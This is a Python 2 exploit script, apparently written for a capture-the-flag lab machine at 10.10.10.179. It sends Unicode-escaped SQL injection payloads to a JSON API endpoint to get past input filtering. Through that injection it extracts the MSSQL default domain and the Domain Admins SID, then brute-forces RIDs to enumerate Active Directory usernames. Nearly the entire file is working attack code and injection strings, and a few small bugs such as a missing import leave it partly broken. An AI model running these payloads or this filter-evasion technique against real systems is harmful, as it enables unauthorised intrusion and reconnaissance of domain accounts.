#!/usr/bin/python

import requests
import json
import struct
import time

print "[+] Enter The Range Of RID From Where You Want To Generate"
i = int(input("[+] Start :  "))
j = int(input("[+] Ending : "))

# Encoding into UTF-16

def unicode(payload):
    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "\\u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '\\u%.4X' % ord(payload[i])
                i += 1

    return retVal

# Getting RID
def get_rid(i):
    h = hex(i)
    h = struct.pack('<I',int(h, base=16))
    rid = h.encode('hex')[0:4] + "0000"
    return rid


ip = "10.10.10.179"
vulnerable_uri = "/api/getColleagues"
url = "http://" + ip + vulnerable_uri

# It takes Json input And give json outpu so we need to take this heafer
header = {"Content-Type": "application/json", 
        "Accept" : "text/plain",
        "Accept-Language" : "en-US"  
        }
# if The site doesn't give json input ouput then we don't need to specify header

print "[+] Enumerating Domain...\n"
query = "' AND 1=0 UNION ALL SELECT 1,DEFAULT_DOMAIN(),3,4,5 -- -"
payload = unicode(query)
data  = '{"name" : "' + payload +'"}'   # Here "name" parameter is a vulnearable parameter and its a json input 
#data = {"name" : payload}              # If the "name" parameter is not a json but a normal data field we can use this
response = requests.post(url, headers = header, data = data)
data = json.loads(response.text)
domain = data[0]['name']
print "   ",domain,"\n"

print "[+] Enumerating SID....\n"
query = "-' union select 1,(select (select stuff(lower(sys.fn_varbintohexstr((SELECT SUSER_SID('%s\\Domain Admins')))), 1, 2,''))),3,4,5-- -"%domain
payload = unicode(query)
data = '{"name" : "' + payload + '"}'
response = requests.post(url, headers = header, data = data)
data = json.loads(response.text)
sid = data[0]['name']

sid =  "0x" + sid[0:len(sid) - 8]
print "   ",sid


print "[+] Enumerating Domain Uesrs...\n"
for k in range(i, (j+1)):
	new_sid = sid + get_rid(k)
	query = "' AND 1=0 UNION ALL SELECT 1,SUSER_SNAME(" + new_sid + "),3,4,5 -- -"
	payload = unicode(query)
	data = '{"name" :"' + payload + '"}'
	response = requests.post(url, headers = header, data = data)
	if response.status_code == 200:
		json_data = json.loads(response.text)
		if json_data[0]['name'] != "":
			user = json_data[0]['name']
        		print k,"   ",user
	time.sleep(0.5)
print "[+] Ending..."
